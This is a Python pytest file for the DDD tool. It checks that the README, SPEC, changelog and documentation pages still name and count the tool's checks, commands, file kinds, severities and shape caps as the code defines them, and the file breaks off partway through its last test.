"""Checks that the documentation still describes the tool that exists.

Prose rots quietly. These tests pin the few facts that are cheap to verify mechanically -
the names of the checks, the commands, the object kinds - so a rename cannot leave the
README and the SPEC describing a previous version of DDD.
"""

from __future__ import annotations

import argparse
import ast
import contextlib
import dataclasses
import io
import itertools
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import textwrap
import tomllib
import zipfile
from enum import StrEnum
from pathlib import Path
from typing import Any, ClassVar, Literal, NamedTuple

import dev_version
import installed_wheel
import jsonschema
import pytest
import site_versions
import verify_symbols
from packaging.version import Version
from pydantic import BaseModel, ValidationError

from conftest import DEMO
from ddd import __version__
from ddd.analysis import _MAX_LEAVES
from ddd.backends.c.backend import example_template_directory
from ddd.backends.c.model import (
    CodeModel,
    ConversionView,
    LimitsView,
    MemberView,
    ObjectView,
)
from ddd.cli import EXIT_OK, EXIT_USAGE, _build_parser, cmake_module_directory, main, schema_models
from ddd.diagnostics import CHECKS, Severity
from ddd.loading import FILE_KINDS
from ddd.models import MAX_ELEMENTS, Component, DataObject, Datatype, ObjectKind, ScalarType
from ddd.toolbox.findings import FINDINGS

ROOT = Path(__file__).resolve().parents[1]
README = (ROOT / "README.md").read_text(encoding="utf-8")
ELF_SOURCE = (ROOT / "src" / "ddd" / "elf.py").read_text(encoding="utf-8")
SPEC = (ROOT / "SPEC.md").read_text(encoding="utf-8")
EDITOR_INTEGRATION = (ROOT / "docs" / "editor_integration.rst").read_text(encoding="utf-8")
DOCS_WORKFLOW = (ROOT / ".github" / "workflows" / "docs.yml").read_text(encoding="utf-8")
PUBLISH_WORKFLOW = (ROOT / ".github" / "workflows" / "publish.yml").read_text(encoding="utf-8")
CI_WORKFLOW = (ROOT / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
DOCS_URL = "https://sauci.github.io/ddd/"
CONSISTENCY_CHECKS = (ROOT / "docs" / "consistency_checks.rst").read_text(encoding="utf-8")
COMPARING_DELIVERIES = (ROOT / "docs" / "comparing_deliveries.rst").read_text(encoding="utf-8")
CHANGELOG = (ROOT / "CHANGELOG.md").read_text(encoding="utf-8")
COMMAND_LINE_INTERFACE = (ROOT / "docs" / "command_line_interface.rst").read_text(encoding="utf-8")
PAGES = {
    page.relative_to(ROOT).as_posix(): page.read_text(encoding="utf-8")
    for page in sorted((ROOT / "docs").rglob("*.rst"))
    if "superpowers" not in page.parts
}
PAGES["README.md"] = README
"""Every page a reader can reach, by its path, for the claims that may be made on any of them."""

PROJECT_WIDE_DOCUMENTS = {
    "SPEC.md": (SPEC, "`"),
    "README.md": (README, "`"),
    "docs/consistency_checks.rst": (CONSISTENCY_CHECKS, "``"),
    "docs/editor_integration.rst": (EDITOR_INTEGRATION, "``"),
}
"""The documents stating how many checks need every component, each with its own quoting.

Markdown writes a check name in single backticks and reStructuredText in double ones, which
is the only difference between reading the two.
"""

NUMBER_WORDS = {
    "one": 1,
    "two": 2,
    "three": 3,
    "four": 4,
    "five": 5,
    "six": 6,
    "seven": 7,
    "eight": 8,
    "nine": 9,
    "ten": 10,
    "eleven": 11,
    "twelve": 12,
}
"""Enough number words to spell how many checks need the whole project, in prose."""


def flattened(text: str) -> str:
    """One document with its line breaks flattened, so a claim can be matched across them.

    The prose is wrapped by hand, so any sentence long enough to be worth checking is split
    over lines at a position nothing in particular decides.
    """
    return re.sub(r"\s+", " ", text)


def project_wide_checks() -> list[str]:
    """The checks that reach the wrong answer when a component of the project is missing."""
    return [name for name, info in CHECKS.items() if info.needs_every_component]


def project_wide_counts(text: str) -> list[str]:
    """The number word of every "N checks ... need every component" claim of one document.

    Both spellings of the subject: a document says the checks need "every component of a
    project" or "the whole project", and a count was stale under the second while every
    document that uses the first was pinned.
    """
    claim = r"(\w+) checks(?: that)? need (?:every component of a project|the whole project)"
    return [word for word in re.findall(claim, flattened(text)) if word.lower() in NUMBER_WORDS]


def project_wide_enumerations(text: str, tick: str) -> list[list[str]]:
    """The check names each such claim goes on to list, for the claims that list them.

    The enumeration is read as the run of quoted identifiers that follows the claim, so a
    name dropped from the list, or one invented for it, differs from ``CHECKS`` here instead
    of waiting for a reader who happens to know the registry by heart.
    """
    marker = re.escape(tick)
    item = f"{marker}[a-z][a-z0-9-]*{marker}"
    claim = re.compile(
        r"\w+ checks(?: that)? need every component of a project"
        rf"[^`]{{0,40}}?({item}(?:(?:,| and) {item})+)"
    )
    return [
        re.findall(f"{marker}([a-z][a-z0-9-]*){marker}", found)
        for found in claim.findall(flattened(text))
    ]


def spelled_number(word: str) -> int | None:
    """A number written in words the way the prose writes them, or ``None`` for a non-number."""
    tens = {"twenty": 20, "thirty": 30, "forty": 40, "fifty": 50}
    head, _, unit = word.lower().partition("-")
    if head in NUMBER_WORDS and not unit:
        return NUMBER_WORDS[head]
    if head in tens:
        return tens[head] + NUMBER_WORDS.get(unit, 0)
    return None


def counted_in_words(text: str, *patterns: str) -> list[str]:
    """The number words of every claim of one document that one of the patterns recognises.

    A claim counting in digits, or in a word this file has no number for, is not a claim these
    guards can weigh, so it is left out rather than being answered wrongly - and what is left
    is what a positive control has to find, or the guard is passing on an empty list.
    """
    found = [
        word.lower()
        for pattern in patterns
        for word in re.findall(pattern, flattened(text), flags=re.I)
    ]
    return [word for word in found if word in NUMBER_WORDS]


def fixed_severity_counts(text: str) -> list[str]:
    """The number words of every "N checks whose severity ..." claim of one document."""
    return counted_in_words(
        text,
        r"\b(\w+) (?:load time )?(?:checks )?whose severity\b",
        r"\b(\w+) checks cannot be relaxed",
    )


def description_kind_counts(text: str) -> list[str]:
    """The number words of every "N description kinds" claim of one document."""
    return counted_in_words(text, r"\b(\w+) description kinds")


def commands() -> list[str]:
    """The subcommands the parser actually offers.

    argparse has no public accessor for the choices of a subparser action, so this reaches
    for the action itself. It is a test helper: if a future argparse moves it, this fails
    loudly here instead of quietly weakening a documentation check.
    """
    parser = _build_parser()
    action = next(
        action for action in parser._actions if isinstance(action, argparse._SubParsersAction)
    )
    return sorted(action.choices)


class TestChecks:
    @pytest.mark.parametrize("check", sorted(CHECKS))
    def test_every_check_is_named_in_the_readme(self, check: str) -> None:
        assert f"`{check}`" in README

    @pytest.mark.parametrize("check", sorted(CHECKS))
    def test_every_check_is_named_in_the_spec(self, check: str) -> None:
        assert f"`{check}`" in SPEC

    def test_the_readme_invents_no_check(self) -> None:
        """A check named in the README but not registered would be an empty promise."""
        claimed = set(re.findall(r"`([a-z][a-z0-9]*(?:-[a-z0-9]+)+)`", README))
        # Only names that look like check identifiers are considered; command line flags and
        # file names contain other characters.
        unknown = {name for name in claimed if name not in CHECKS and "-" in name}
        assert unknown <= {
            "dry-run",
            "address-map",
            "byte-order",
            "output-dir",
            "cmake-dir",
            "no-cov",
            "cov-fail-under",
            "no-propagate-headers",
            "ddd-compile",
            "ddd-id",
            "ddd-tool",
        }, f"README mentions unknown checks: {sorted(unknown)}"

    @pytest.mark.parametrize("name", sorted(PROJECT_WIDE_DOCUMENTS))
    def test_the_checks_needing_every_component_are_counted_as_the_registry_counts_them(
        self, name: str
    ) -> None:
        """A count spelled out in prose is the claim a reader cannot check while reading.

        Both documents state it, and one of them states it twice - the language server holds
        back exactly the checks that declare they need the whole project, so a check gaining
        or losing that flag makes every one of those sentences wrong at once.
        """
        document, _ = PROJECT_WIDE_DOCUMENTS[name]
        expected = len(project_wide_checks())
        counts = project_wide_counts(document)
        assert counts, f"{name} no longer says how many checks need every component"
        for word in counts:
            assert NUMBER_WORDS[word.lower()] == expected, (
                f"{name} says {word} checks need every component of a project, and {expected} do"
            )

    @pytest.mark.parametrize("name", sorted(PROJECT_WIDE_DOCUMENTS))
    def test_the_checks_needing_every_component_are_named_as_the_registry_names_them(
        self, name: str
    ) -> None:
        """Each document also lists them once, and a list is a second thing that can drift."""
        document, tick = PROJECT_WIDE_DOCUMENTS[name]
        expected = project_wide_checks()
        enumerations = project_wide_enumerations(document, tick)
        assert len(enumerations) == 1, f"{name} enumerates them {len(enumerations)} times, not once"
        assert sorted(enumerations[0]) == sorted(expected), (
            f"{name} lists {sorted(enumerations[0])}; the registry says {sorted(expected)}"
        )


IDENTIFIER_LIFETIME = {
    "SPEC.md": SPEC,
    "CHANGELOG.md": CHANGELOG,
    "docs/consistency_checks.rst": CONSISTENCY_CHECKS,
    "docs/getting_started.rst": PAGES["docs/getting_started.rst"],
}
"""The documents that say how long a check identifier lives, which had better agree."""


class TestHowLongACheckIdentifierLives:
    """One rule, in the four places that state it.

    A build script pins an identifier in a severity override, and what it is entitled to
    assume was written three ways: the specification and the check reference say an identifier
    does not change once published, the tutorial said it does not change *within a major
    version*, and the changelog's preamble listed the identifiers among the interface a
    release may change provided it says what the migration costs. A reader pinning one got
    three different lifetimes for it; the specification's is the rule.
    """

    @pytest.mark.parametrize("document", sorted(IDENTIFIER_LIFETIME))
    def test_it_is_until_the_end_in_every_document(self, document: str) -> None:
        text = flattened(IDENTIFIER_LIFETIME[document])
        assert re.search(r"not\W+change\b[^.]{0,40}\bonce\b", text), (
            f"{document} no longer says that an identifier does not change once published"
        )
        assert "within a major version" not in text, (
            f"{document} promises an identifier only until the next major version, which is a "
            f"shorter life than the specification gives it"
        )


class TestTheCheckReference:
    """The reference page promises the registry in one place, so the registry is what it is held to.

    Seven checks were added to the registry over three releases and none reached the tables;
    a reader who met one of them in a build log found nothing to look up.
    """

    @pytest.mark.parametrize("check", sorted(CHECKS))
    def test_every_check_has_a_row_on_the_reference_page(self, check: str) -> None:
        assert f"``{check}``" in CONSISTENCY_CHECKS

    @pytest.mark.parametrize(
        "check", sorted(name for name, info in CHECKS.items() if info.comparison)
    )
    def test_every_comparison_check_is_in_the_comparison_table(self, check: str) -> None:
        """The comparison page grades every difference; one it does not list cannot be looked up."""
        rows = re.findall(
            r"\* - (?:error|warning|info)\n\s+- ``([a-z0-9-]+)``", COMPARING_DELIVERIES
        )
        assert check in rows, f"the comparison table lists {sorted(rows)}"

    def test_the_spec_lists_each_comparison_id_under_a_heading_of_its_severity(self) -> None:
        """SPEC 4.1 grades by list: errors, warnings, information. A bullet under another
        severity's heading tells its reader the wrong grade, and no other test reads where
        a bullet sits."""
        section = SPEC.split("### 4.1 Comparing two deliveries")[1].split("\n### ")[0]
        headings = {"Errors,": Severity.ERROR, "Warnings,": Severity.WARNING}
        current: Severity | None = None
        seen: dict[str, set[Severity | None]] = {}
        for line in section.splitlines():
            if line.startswith("Information:"):
                current = Severity.INFO
            elif line.startswith(tuple(headings)):
                current = headings[line.split()[0]]
            elif (found := re.match(r"- `([a-z0-9-]+)`:", line)) and found.group(1) in CHECKS:
                seen.setdefault(found.group(1), set()).add(current)
        assert seen, "no comparison id found in section 4.1"
        # Not only a comparison check: the one id the comparison borrows from the consistency
        # checks, ``missing-producer``, is listed there too, and holds a grade of its own.
        assert "missing-producer" in seen
        wrong = {
            name: (under, CHECKS[name].default_severity)
            for name, under in seen.items()
            if under != {CHECKS[name].default_severity}
        }
        assert not wrong, f"listed under a heading of another severity (under, registry): {wrong}"

    @pytest.mark.parametrize(
        "check", sorted(name for name, info in CHECKS.items() if info.comparison)
    )
    def test_the_comparison_table_grades_each_id_as_the_registry_does(self, check: str) -> None:
        """Both tables of the pages state the severity beside the id, and errors come first."""
        rows = {
            name: severity
            for severity, name in re.findall(
                r"\* - (error|warning|info)\n\s+- ``([a-z0-9-]+)``", COMPARING_DELIVERIES
            )
        }
        assert rows[check] == CHECKS[check].default_severity.value
        checks_page = dict(
            re.findall(r"\* - ``([a-z0-9-]+)``\n\s+- (error|warning|info)\n", CONSISTENCY_CHECKS)
        )
        assert checks_page[check] == CHECKS[check].default_severity.value

    def test_the_comparison_tables_list_errors_before_warnings_before_information(self) -> None:
        order = {"error": 0, "warning": 1, "info": 2}
        for severities in (
            re.findall(r"\* - (error|warning|info)\n\s+- ``[a-z0-9-]+``", COMPARING_DELIVERIES),
            [
                severity
                for name, severity in re.findall(
                    r"\* - ``([a-z0-9-]+)``\n\s+- (error|warning|info)\n", CONSISTENCY_CHECKS
                )
                if name in CHECKS and CHECKS[name].comparison
            ],
        ):
            ranks = [order[severity] for severity in severities]
            assert ranks == sorted(ranks)

    def test_changed_storage_says_the_raster_in_one_wording_everywhere(self) -> None:
        wording = "or the event or cycle of a raster"
        assert wording in CHECKS["changed-storage"].description
        for name, text in {
            "README.md": README,
            "docs/consistency_checks.rst": CONSISTENCY_CHECKS,
            "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
            "SPEC.md": SPEC,
        }.items():
            flat = flattened(text)
            assert wording in flat, name
            assert "event or the cycle of a raster" not in flat, name

    def test_the_comparison_page_says_a_renamed_constant_is_two_findings(self) -> None:
        page = flattened(COMPARING_DELIVERIES)
        assert (
            "A constant that was renamed is two findings, ``removed-constant`` for the old name "
            "and ``added-constant`` for the new one"
        ) in page
        assert (
            "has no `id`, so one renamed is this finding for the old name and `added-constant` "
            "for the new one"
        ) in flattened(SPEC)

    def test_the_registry_describes_changed_storage_as_the_pages_do(self) -> None:
        """``ddd checks`` prints the registry's one-liner; the raster joined the comparison
        without joining it, so the tool and the pages disagreed on what the check covers."""
        assert "raster" in CHECKS["changed-storage"].description

    CHANGED_INTERFACE = (
        "kind, datatype, unit, scaling, shape, axes, locality or where a table keeps its point "
        "counts changed, or the value of a constant, or the layout a released structure fixed: a "
        "bitfield's width, the type a structured variable names, or the members of that "
        "structure in order, each with what it holds and its dimensions, nested and external "
        "ones included, an external one by its header too, save a member added at the end of it "
        "when the variable is no array, or volatile turned on for an object a component reads or "
        "an output of a component read alone"
    )

    def test_the_registry_and_the_three_tables_say_one_wording_of_changed_interface(
        self,
    ) -> None:
        """What the check fires for, as ``ddd checks`` prints it and as the README, the check
        reference and the comparison page each tabulate it. The layout grew from the order of
        the members to every member and what it holds, and a table still naming the order alone
        told its reader that an inserted member, or an external one of another type, does not
        fire."""
        description = CHECKS["changed-interface"].description
        assert description == self.CHANGED_INTERFACE
        tables = {
            "README.md": README,
            "docs/consistency_checks.rst": CONSISTENCY_CHECKS,
            "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
        }
        for name, text in tables.items():
            assert description in flattened(text), name

    def test_the_pages_agree_that_a_precompiled_reader_is_left_wrong(self) -> None:
        """Between two deliveries a reader may be a binary compiled against the baseline, so
        the comparison page no longer says that every consumer is recompiled and nobody is left
        wrong; and the rename's pair runs the other way from the removal's, for a reason each
        page gives once: a relaxation of ``renamed-object`` must not reach a read object's
        rename."""
        page = flattened(COMPARING_DELIVERIES)
        assert "so nobody is left wrong" not in page
        assert (
            "a reader may be a binary compiled against the previous headers and never regenerated"
            in page
        )
        why = "keeps the plain id for the unread rename"
        assert why in page and why in flattened(SPEC)
        assert "reported as a `renamed-object`, or a `renamed-read-object`" in flattened(SPEC)
        said = (
            "volatile turned on for an object a component reads or an output of a component read "
            "alone is changed-interface instead"
        )
        assert said in CHECKS["changed-storage"].description
        assert said in flattened(README)
        assert said in page

    def test_every_page_grades_a_rename_by_whether_somebody_reads_the_object(self) -> None:
        """A reader may be a binary compiled against the previous headers, so a rename of an
        object a component reads is an error under an id of its own and the warning stays for
        an object nobody reads; ``changed-interface`` and ``changed-storage`` say the same for
        ``volatile`` turned on. The registry and each page say so."""
        assert CHECKS["renamed-read-object"].default_severity is Severity.ERROR
        assert CHECKS["renamed-object"].default_severity is Severity.WARNING
        assert CHECKS["renamed-object"].description.endswith(
            "no component read it, and it is not an output of a component read alone"
        )
        for name, text in {
            "README.md": README,
            "docs/consistency_checks.rst": CONSISTENCY_CHECKS,
            "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
            "SPEC.md": SPEC,
        }.items():
            flat = flattened(text)
            assert "renamed-read-object" in flat, name
            assert "different name and no component read it" in flat, name
        assert "does not reach this error" in flattened(CONSISTENCY_CHECKS)
        assert "does not reach this error" in flattened(SPEC)
        assert "turned off it is this check whoever reads" in flattened(SPEC)
        assert "A `-W renamed-object` relaxation does not reach it" in flattened(README)
        assert "A ``-W renamed-object`` relaxation does not reach it" in flattened(
            COMPARING_DELIVERIES
        )
        assert (
            "volatile` turned on for an object a component reads or an output of a component "
            "read alone is `changed-interface`"
        ) in flattened(SPEC)
        assert "Turning ``volatile`` on is a changed interface for an object a component reads" in (
            flattened(COMPARING_DELIVERIES)
        )

    def test_every_page_grades_a_narrowed_condition_by_whether_somebody_reads_the_object(
        self,
    ) -> None:
        """Wrapping an object a component reads in a condition takes it from every build where
        that is false, and a reader compiled against the baseline stops linking there: an error
        under an id of its own, so that ``changed-condition`` keeps its warning for a condition
        going away and for an object nobody reads, and a relaxation of it does not reach the
        error. The registry and each page say so."""
        assert CHECKS["narrowed-condition"].default_severity is Severity.ERROR
        assert CHECKS["changed-condition"].default_severity is Severity.WARNING
        assert CHECKS["changed-condition"].description.endswith("narrowed-condition instead")
        for name, text in {
            "README.md": README,
            "docs/consistency_checks.rst": CONSISTENCY_CHECKS,
            "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
            "SPEC.md": SPEC,
        }.items():
            flat = flattened(text)
            assert "narrowed-condition" in flat, name
            assert "changed-condition" in flat, name
        assert "`-W changed-condition` relaxes only the warning below and does not reach this" in (
            flattened(SPEC)
        )
        assert "and `narrowed-condition` where a component reads it" in flattened(SPEC)
        assert "``-W changed-condition=ignore`` relaxes the warning only, and does not reach" in (
            flattened(COMPARING_DELIVERIES)
        )
        assert "is narrowed-condition instead" in flattened(README)
        for text in (CONSISTENCY_CHECKS, COMPARING_DELIVERIES):
            assert (
                "component reads, or on an output of a component read alone, is "
                "``narrowed-condition`` instead"
            ) in flattened(text)
        assert "A `-W changed-condition` relaxation does not reach it" in flattened(README)
        assert "A ``-W changed-condition`` relaxation does not reach it" in flattened(
            CONSISTENCY_CHECKS
        )
        assert "a condition added to an object a component reads" in flattened(SPEC)
        assert "no longer link there" in flattened(COMPARING_DELIVERIES)

    def test_the_pages_say_a_structured_variable_with_no_leaf_is_compared_as_an_object(
        self,
    ) -> None:
        """A structure holding members of external types alone has no leaf, so what a leaf says
        of its variable - gone, renamed, reused, new - is said at the variable, graded as an
        object is, and its ``kind`` once at the variable; a variable that has leaves is not said
        a second time, and a removal at the variable carries no lost-identity note. The SPEC and
        the comparison page say so."""
        spec = flattened(SPEC)
        for sentence in (
            "an instance with no leaf included: its removal, its rename, its reuse of a name "
            "and its `kind` are reported at the instance, where nothing else says them",
            "is the only record of a variable of a structure holding members of external types "
            "alone, which has no leaf",
            "A structured variable with no leaf is one, said at the variable; one that has "
            "leaves is said by its leaves, and not a second time.",
            "a variable with no leaf is said at the variable.",
            "A structured variable with no leaf is one of the names, and says it at the variable",
            "`removed-unused-object`: an object is gone that no component read, a structured "
            "variable with no leaf included.",
            "`added-object`: the candidate declares an object the baseline did not, a "
            "structured variable with no leaf included.",
            "a structured variable with no leaf is listed once, under its own `id`, and a "
            "member of a structured variable that has leaves is listed once per member",
            "its `kind`, its array shape and its locality as interface",
            "A structure holding only members of external types, at any depth, holds nothing "
            "DDD can see into, and its variable has no leaf.",
            "Such a variable **shall** therefore be reported as an object is, at the variable, "
            "and graded as one",
            "A variable that has leaves is not said a second time at the variable.",
            "A removed structured variable with no leaf carries no such note, since it has no "
            "interface to match an addition on.",
            "What a leaf says of a variable - that it is gone, that it went under another name, "
            "that its name is another object's, that it is new - is then said by nothing",
            "and a variable could be removed, renamed or reused with no finding at all while "
            "every reader's header lost the declaration, or found another object where the "
            "name was",
            "its removal is `removed-object`, or `removed-unused-object` where no component "
            "read it",
            "where the baseline is a component read alone it is graded by its scope as an "
            "object's is",
            "its rename is `renamed-read-object`, or `renamed-object` where no component read "
            "it, and is in the migration map",
            "another `id` under its name is `reused-name`",
            "and a variable that arrived is `added-object`",
            "The side a finding is about says whether the variable has a leaf: the baseline's "
            "for a removal, a rename and a reused name, the candidate's for an addition.",
            "a variable with leaves says it at each of its leaves' paths.",
            "where nothing else says them ([section 4.1](#41-comparing-two-deliveries))",
            "a delivery comparison reads the removal, the rename and the reuse of such a "
            "variable from it ([section 4.1](#41-comparing-two-deliveries))",
        ):
            assert sentence in spec, sentence
        page = flattened(COMPARING_DELIVERIES)
        for sentence in (
            "A structured variable of a structure that holds members of external types alone, "
            "at any depth, has no leaf",
            "the variable is reported as an object is, at the variable",
            "``renames.json`` lists it under its own id",
            "A variable that has leaves is not said a second time at the variable.",
            "a structured variable with no leaf is an object here",
            "no component read it, a structured variable with no leaf included",
            "is one ``changed-interface`` at the variable and not one per member, a structure "
            "of external members included",
            "because DDD cannot see into storage its own types do not describe, and so nothing "
            "says its removal, its rename or its reuse",
            "Dropped, it is ``removed-object`` where a component read it and "
            "``removed-unused-object`` where none did",
            "a baseline that is a component file read alone grades it by its scope, as it does "
            "an object",
            "renamed with its ``id`` kept, it is ``renamed-read-object`` or ``renamed-object``",
            "another ``id`` under its name is ``reused-name``",
            "and one that arrived is ``added-object``",
            "Its ``kind`` is the variable's as well: a measurement turned into a parameter is "
            "one edit of one declaration, and the declaration in every reader's header gains a "
            "``const``",
        ):
            assert sentence in page, sentence

    def test_every_page_compares_constants_and_rasters_as_entries(self) -> None:
        """A constant reaches every reader as a macro and the a2l as a ``SYSTEM_CONSTANT``, and a
        raster is the event every ``IF_DATA`` that names it carries: a changed value is an
        interface, a changed event or cycle is storage, a constant gone is an error under an id
        of its own and one that came is an information. The registry and each page say so."""
        assert CHECKS["removed-constant"].default_severity is Severity.ERROR
        assert CHECKS["added-constant"].default_severity is Severity.INFO
        assert CHECKS["removed-constant"].comparison and CHECKS["added-constant"].comparison
        assert "or the value of a constant" in CHECKS["changed-interface"].description
        assert "or the event or cycle of a raster" in CHECKS["changed-storage"].description
        for name, text in {
            "README.md": README,
            "docs/consistency_checks.rst": CONSISTENCY_CHECKS,
            "docs/comparing_deliveries.rst": COMPARING_DELIVERIES,
            "SPEC.md": SPEC,
        }.items():
            flat = flattened(text)
            assert "removed-constant" in flat, name
            assert "added-constant" in flat, name
            assert "the value of a constant" in flat, name
            assert "event or cycle of a raster" in flat or "event or the cycle of a raster" in flat
        page = flattened(COMPARING_DELIVERIES)
        assert "a gain used by no object is the case that was silent" in page
        assert "the macro and the size are two facts and neither stands for the other" in page
        assert "A raster that came or went says nothing" in page
        assert "recorded no constants, so against one none is compared" in page
        assert "which recorded no constants, has none to compare them with" in flattened(SPEC)
        assert "``10ms`` respelled ``10000us`` is no change" in page
        assert "is the variable's one ``changed-interface``" in page
        assert "a change of a section's access or alignment waits for it to" in page
        spec = flattened(SPEC)
        assert "the macro and the size are two facts and neither stands for the other" in spec
        assert "an external member by its type's name, its header and its `dimensions`" in spec
        assert "not compared until the dictionary carries them" in spec
        assert "a raster that came or went is not said" in spec

    def test_the_registry_describes_address_missing_as_the_pages_do(self) -> None:
        """``ddd checks`` prints the registry's one-liner, and since ``--image`` the check is
        about a symbol the image does not place as much as one the map leaves out: a line naming
        the map alone told a user of the image that the check was not about them."""
        description = CHECKS["address-missing"].description
        assert "address map" in description
        assert "image" in description

    def test_the_registry_describes_condition_left_out_by_what_the_build_holds(self) -> None:
        """``ddd checks`` prints the registry's one-liner, which said the check was for an object
        stating a condition that gets no address: one the build holds and the source cannot
        place is ``address-missing``, whatever condition it states."""
        description = CHECKS["condition-left-out"].description
        assert "gets no address" not in description
        assert description == (
            "the build holds nothing of an object stating a condition, which the a2l leaves out: "
            "the image defines no variable or symbol of its name, or the address map names none "
            "of it"
        )

    def test_the_pages_say_reference_left_out_names_each_axis_and_its_condition(self) -> None:
        """One finding named every curve that went with any axis, pointing at an information
        printed after it, which a project may ignore: each axis now has a finding of its own."""
        assert (
            "It is one finding per axis, naming the axis, its condition and what goes with it, a "
            "map over two such axes named under each."
        ) in flattened(SPEC)
        assert (
            "One finding per axis names the axis and its condition beside what goes with it."
        ) in flattened(CONSISTENCY_CHECKS)

    @pytest.mark.parametrize("page", sorted(PAGES))
    def test_the_fixed_checks_are_counted_as_the_registry_counts_them(self, page: str) -> None:
        """ "The five checks whose severity cannot be changed" went stale when two more joined.

        Any page may count them, so every page is read; a sentence that counts them in words
        has to count what the registry marks as not overridable.
        """
        expected = sum(1 for info in CHECKS.values() if not info.overridable)
        for word in fixed_severity_counts(PAGES[page]):
            assert NUMBER_WORDS[word] == expected, (
                f"{page} counts {word} checks with a fixed severity; the registry has {expected}"
            )


class TestTheFileKinds:
    """A seventh file kind was added, and the lists of them written in prose stayed at six."""

    @pytest.mark.parametrize("page", sorted(PAGES))
    def test_the_description_kinds_are_counted_as_the_loader_counts_them(self, page: str) -> None:
        for word in description_kind_counts(PAGES[page]):
            assert NUMBER_WORDS[word] == len(FILE_KINDS), (
                f"{page} counts {word} description kinds; the loader knows {len(FILE_KINDS)}"
            )

    def test_the_file_kind_row_names_every_kind(self) -> None:
        """The row explaining the check enumerates what a top level key may be, in full."""
        row = re.search(r"\* - ``file-kind``\n(.*?)\n   \* - ``", CONSISTENCY_CHECKS, flags=re.S)
        assert row is not None
        for kind in FILE_KINDS:
            assert f"``{kind}``" in row.group(1), f"the file-kind row does not name {kind}"


CAPPED = {"docs/faq.rst": PAGES["docs/faq.rst"], "SPEC.md": SPEC}
"""The documents that state how large a shape may be, and so have to state the same numbers."""


class TestTheCapsOnAShape:
    """Four limits an object is held to, and the page that answered there were none.

    The caps arrived in 0.9.0 and the FAQ's answer did not move, so a reader sizing a buffer
    by the page met ``error[schema]`` on the day the product went past ten million - the one
    kind of documentation mistake that costs a whole day, since the page promises exactly
    the thing the tool refuses.

    Read from the analysis rather than from a list of numbers written here, so that a cap
    changed in the code fails on the pages that state it.
    """

    @pytest.mark.parametrize("document", sorted(CAPPED))
    def test_the_caps_are_stated_as_the_analysis_applies_them(self, document: str) -> None:
        text = flattened(CAPPED[document])
        for cap in (MAX_ELEMENTS, _MAX_LEAVES):
            spelled = f"{cap:,}".replace(",", " ")
            assert spelled in text, f"{document} does not state the cap of {spelled}"

    def test_the_page_that_answers_how_large_no_longer_promises_no_bound(self) -> None:
        answer = flattened(PAGES["docs/faq.rst"]).split("How large may an array be?", 1)[1]
        assert "no bound" not in answer, "the FAQ still answers that a shape is unbounded"
        assert "caps neither" not in answer, "the FAQ still answers that DDD caps nothing"
        assert "schema" in answer, "the FAQ does not say what a shape past a cap is reported as"


class TestCommands:
    @pytest.mark.parametrize("command", commands())
    def test_every_command_is_documented_in_the_readme(self, command: str) -> None:
        assert f"ddd {command}" in README or f"`{command}`" in README

    @pytest.mark.parametrize("command", commands())
    def test_every_command_is_named_in_the_spec(self, command: str) -> None:
        """The developer page promises both documents, and only one was being read.

        The test beside this one compares the parser with a list written out here, which
        catches a command appearing or disappearing and says nothing whatever about the
        specification - so the SPEC could have gone on describing thirteen commands, or
        naming one that no longer exists, without a red test.
        """
        assert f"ddd {command}" in SPEC or f"`{command}`" in SPEC

    def test_the_parser_offers_the_commands_this_suite_knows_about(self) -> None:
        """A change detector on the parser: a new command has to be added here, and the two
        tests above then hold it to being documented in both places."""
        assert set(commands()) == {
            "check",
            "compare",
            "generate",
            "list",
            "dump",
            "id",
            "schema",
            "build-info",
            "lsp",
            "gui",
            "checks",
            "cmake-dir",
            "templates-dir",
            "sources",
            "artefacts",
            "tool",
        }


def commands_with(option: str) -> list[str]:
    """The subcommands offering an option, an artefact of ``generate`` counting for it."""
    parser = _build_parser()
    action = next(
        action for action in parser._actions if isinstance(action, argparse._SubParsersAction)
    )

    def offers(sub: argparse.ArgumentParser) -> bool:
        for candidate in sub._actions:
            if option in candidate.option_strings:
                return True
            if isinstance(candidate, argparse._SubParsersAction):
                return any(offers(nested) for nested in candidate.choices.values())
        return False

    return sorted(name for name, sub in action.choices.items() if offers(sub))


class TestTheCommandPage:
    """The hand-written half of the command reference, held to the parser as the other half is."""

    COMMAND_PAGE = PAGES["docs/command_line_interface.rst"]

    @pytest.mark.parametrize("command", commands())
    def test_every_command_has_a_row_in_the_command_table(self, command: str) -> None:
        assert f"``ddd {command}" in self.COMMAND_PAGE

    def test_the_schema_kinds_are_the_ones_the_parser_offers(self) -> None:
        """A kind added to ``ddd schema`` has to reach the sentence that lists them."""
        listed = re.search(
            r"print the json schema of ((?:``[a-z]+``(?:, | or )?)+)", flattened(self.COMMAND_PAGE)
        )
        assert listed is not None
        assert set(re.findall(r"``([a-z]+)``", listed.group(1))) == set(schema_models())

    def test_the_values_grid_is_said_to_refuse_a_whole_number_past_2_53(self) -> None:
        """What ``objectValues.ts`` and ``object_values.py`` do with a number the page's double
        cannot hold, said where the grid is described."""
        text = flattened(self.COMMAND_PAGE)
        assert (
            "a cell of an integer datatype refuses a number past 2^53 either side of zero, however "
            "it is spelled, where it is typed or pasted in raw, and a fraction the double would "
            "drop with it; in physical it refuses a value whose raw count lies past 2^53"
        ) in text
        assert (
            "A float's cell takes every number as the double it is, but none past what its float "
            "holds, nor one rounding to zero in it"
        ) in text
        assert (
            "typed or pasted in raw into a ``float32`` cell, a number is planned as the float32 it "
            "rounds to, so C's ``3.4028235e38`` is FLT_MAX's own double"
        ) in text
        assert "or one at 2^53 in a ``uint64`` or ``sint64``, says it cannot show it" in text
        assert (
            "from the page neither takes a whole number at 2^53 or past it, as a value or as a "
            "limit, however it is written - the server refuses a bound at or past 2^53 for either, "
            "written in digits or as a float"
        ) in text
        assert (
            "show a bound past 2^53 in its file's own digits, and read a bound as a cell of the "
            "datatype the declarations state reads a number: a float's as the double it is, "
            "written as a float, and any other's refused past 2^53 however it is spelled, and "
            "wherever the double would send another number than the one typed"
        ) in text

    def test_the_values_grid_is_said_to_write_numbers_as_they_are(self) -> None:
        """What ``numbers.ts`` and ``object_values.py`` write of a number typed, and what Physical
        shows, said where the grid is described."""
        text = flattened(self.COMMAND_PAGE)
        assert (
            "A physical value comes to its raw count exactly, worked out on the decimals typed "
